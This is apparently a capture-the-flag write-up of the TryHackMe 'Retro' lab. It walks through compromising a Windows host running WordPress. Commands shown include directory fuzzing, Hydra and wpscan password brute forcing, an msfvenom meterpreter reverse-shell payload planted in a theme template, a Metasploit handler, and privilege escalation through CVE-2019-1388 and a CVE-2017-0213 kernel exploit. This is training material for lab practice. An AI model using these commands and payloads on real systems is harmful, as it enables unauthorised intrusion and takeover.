**Note: I had significant issues working through this box, as the connection would frequently be dropped. I'm not sure if this is because I was using Kali through VMware. I ended up switching to the built-in Kali box on TryHackMe, which seemed to help.**

# Enumeration

A quick nmap scan reveals that ports 80 and 3389 are open.
 
![89a228305530310cf47a347e88c772d6.png](/Retro/_resources/89a228305530310cf47a347e88c772d6-1.png)
 
Investigating the web server reveals nothing immediate. We search for directories using FFUF.

```bash
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://10.10.18.117/FUZZ -c -t 100 -v
```

A brief explanation of the flags/switches used:
- `-w` specifies the path to the wordlist.
- `-u` specifics the URL, where `FUZZ` indicates the place we should fuzz.
- `-t` specifies the number of threads to use. The default is 40.
- `-v` gives verbose output.
- `-c` makes the output colourful.

Eventually, we find the `/retro` directory. Navigating to this page leads us to a retro gaming blog. We immediately find a username and a link to a login form.
 
![255ae2347532f8812a96a306e85abd34.png](/Retro/_resources/255ae2347532f8812a96a306e85abd34-1.png)

![4fabd57edbd6ee6aa7dc61e507b6ad34.png](/Retro/_resources/4fabd57edbd6ee6aa7dc61e507b6ad34-1.png)

![5c85610d77a5eb7ee447edf631030b53.png](/Retro/_resources/5c85610d77a5eb7ee447edf631030b53-1.png)
 
We also find a blog post revealing some potentially useful information.
 
![93d50d680dfdfbd493a3f64db5ffc33e.png](/Retro/_resources/93d50d680dfdfbd493a3f64db5ffc33e-1.png)
 
At bit of Googling tells us that the name of the avatar that Wade keeps mistyping is referring to is `parzival`.  This turns out to be the password, we we use to log in to Wade's WordPress account.
 
![9907cd4592502321e25444748f8c1952.png](/Retro/_resources/9907cd4592502321e25444748f8c1952-1.png)
 
If we didn't have access to the information given away by Wade, we would have to use Hydra to brute force the login. We already have a possible username, so let's submit the login request to Burp to capture the body of the POST request. Our Hydra command looks like:

```bash
hydra -l Wade -P /usr/share/wordlists/rockyou.txt 10.10.18.117 http-post-form "/retro/wp-login.php:log=^USER^&pwd=^PASS^:The password you entered" -v
```

(At this point, it seems that my machine died. Terminating and trying a new one.)

Hydra doesn't seem to be working here, as the connection seems to time out. Let's try wpscan.

`wpscan --url http://10.10.127.19/retro/wp-login.php -U Wade -P /usr/share/wordlists/rockyou.txt
`

This also doesn't seem to work. Luckily, we already have the password!

<br>

# Exploitation

Now that we have access to Wade's Wordpress account, let's try and use the WordPress theme editor to edit the 404 Template and upload a reverse shell.
 
![5683c9ad5042de27f889314759a5ad02.png](/Retro/_resources/5683c9ad5042de27f889314759a5ad02-1.png)
 
We will edit the 404 Template; our goal is to upload a reverse shell using this editor in order to get command execution of the underlying machine. Set up a netcat lister with `rlwrap nc -lvnp 9999`. Let's use [Pentestmonkey's php reverse shell script](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php). This is what we'll do. Make the appropriate changes to the script, update the 404 Template file, and navigate to any invalid url on the webpage. The reverse shell tries to launch, but we encounter an error.
 
![d93a8e9449266c751dabafddae677f8d.png](/Retro/_resources/d93a8e9449266c751dabafddae677f8d-1.png)

![6ae90c35a0451cc58796d62cda3930bc.png](/Retro/_resources/6ae90c35a0451cc58796d62cda3930bc-1.png)
 
Some Googling tells us that we're not the first to encounter this error. Thankfully, the explanation is simple.
 
![99aeceb1a7c252ee0fa0338c6361e335.png](/Retro/_resources/99aeceb1a7c252ee0fa0338c6361e335-1.png)
 
We could also try using a [php reverse shell for Windows machines](https://github.com/Dhayalanb/windows-php-reverse-shell), but this didn't work for me either.

Let's instead try using a php reverse shell payload generated by msfvenom.
```bash
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.6.30.43 LPORT=9999 -f raw
```

Now copy and paste the raw output into the 404 template and update the file.
 
![7ca759846f47cf684397cfa3868ea91d.png](/Retro/_resources/7ca759846f47cf684397cfa3868ea91d-1.png)
 
Before proceeding, we set up a handler with Metasploit as follows:
```bash
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload payload/php/meterpreter/reverse_tcp
payload => php/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.6.30.43
LHOST => 10.6.30.43
msf6 exploit(multi/handler) > set LPORT 9999
LPORT => 9999
msf6 exploit(multi/handler) > run
```

Now send the reverse shell by triggering the 404. Meterpreter catches the reverse shell, and we have an initial foothold.
 
![011e8b21d3b0f57071380f0fcbb53c55.png](/Retro/_resources/011e8b21d3b0f57071380f0fcbb53c55-1.png)
 
At this point, the Meterpreter shell did not do much for me; basic commands like `cd` would often fail. This held true even after switching to the Kali instance on THM.

Luckily, there is another method for gaining initial access into the system. Recall that port 3389 was also open, so we may be albe to RDP into the Windows machine. Using `xfreerdp /u:wade /v:10.10.100.184` and inputting Wade's password get's us in. The `user.txt` flag is on the desktop.
 
![b5bd1fb1040d70714f3896ff0e8fdb32.png](/Retro/_resources/b5bd1fb1040d70714f3896ff0e8fdb32-1.png)
 
<br>

# Post-exploitation

Now that we have initial access, let's see if we can gain Administrator access. Looking around a bit, we see that the page to [CVE-2019-1388](https://nvd.nist.gov/vuln/detail/CVE-2019-1388) has been bookmarked in Chrome. This is a Windows Certificate Dialog Elevation of Privilege Vulnerability. Information on how to exploit this vulnerability can be found [here](https://justinsaechao23.medium.com/cve-2019-1388-windows-certificate-dialog-elevation-of-privilege-4d247df5b4d7). A brief summary is also given [here](https://github.com/nobodyatall648/CVE-2019-1388).

To start, we download an executable from [Packet Storm](https://packetstormsecurity.com/files/14437/hhupd.exe.html). Note that this file is also found in the Windows machine's recycling bin.
 
![0837d857d7a2c05ebf8c90db2ffceb19.png](/Retro/_resources/0837d857d7a2c05ebf8c90db2ffceb19-1.png)
 
We need to transfer this file to the target system. Let's set up a web server on our machine with `python -m http.server`.
 
![97fb80da01626337a3300a2937f90c8f.png](/Retro/_resources/97fb80da01626337a3300a2937f90c8f-1.png)

Now run the .exe file as Administrator.

![f956e29aca544a77575e2620eaadcaad.png](/Retro/_resources/f956e29aca544a77575e2620eaadcaad-1.png)

![374876b3445d9626281cee1dbf695611.png](/Retro/_resources/374876b3445d9626281cee1dbf695611-1.png)
 
Here is where I ran into a problem -- the "Issued By" URL needs a default app or browser in order to open. Even after setting a default browser and running through the above steps again, I am not given an option to open the URL. As you can see, the "OK" button remains greyed out:
 
![f24307e975a46e04b5cdc04866457dba.png](/Retro/_resources/f24307e975a46e04b5cdc04866457dba-1.png)
 
At this point, I knew what I had to do but there doesn't seem to be a way to proceed. This issue has been mentioned by many users on the TryHackMe Discord, but I wasn't able to find a solution. The intended path is the following: After opening the "Issued By" URL, we wait for the site to fully load and open a prompt to save the webpage using "Save As". Within this file explorer, we type `C:\WINDOWS\system32\cmd.exe` into the file name bar. This will open a command prompt with root privileges, which we can then use to find the last flag.

Since we're stuck (again), we'll try one last method to get root. Specifically, we're going to use a kernel exploit. Opening the command prompt and using `systeminfo` gives us some information about the Windows build and OS.
 
![66a6c5d935e4ede2a845203c46db7104.png](/Retro/_resources/66a6c5d935e4ede2a845203c46db7104-1.png)
 
Some [research](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---kernel-exploitation) reveals that our build of Windows is affected by [CVE-2017-0213](https://nvd.nist.gov/vuln/detail/CVE-2017-0213), a vulnerability which will allow us to run a kernel exploit and elevate our privileges. A bit of Googling reveals an [exploit](https://github.com/eonrickity/CVE-2017-0213) that we can use. We can confirm that our Windows build is on the list of affected products.
 
![95c14046e1fc85b4f4e2964bbc4711d0.png](/Retro/_resources/95c14046e1fc85b4f4e2964bbc4711d0-1.png)
 
We download the x64 executable to our local machine, host a web server, and download the file on the target. Executing the file gives us a cmd prompt with root access.
 
![9aaeee6dfb96e542ac51e35f643d9bae.png](/Retro/_resources/9aaeee6dfb96e542ac51e35f643d9bae-1.png)
 
Navigating to the Administrator's desktop, we finally find the root flag.
 
![bde4be03ccfeda0354de697ed8934d6c.png](/Retro/_resources/bde4be03ccfeda0354de697ed8934d6c-1.png)
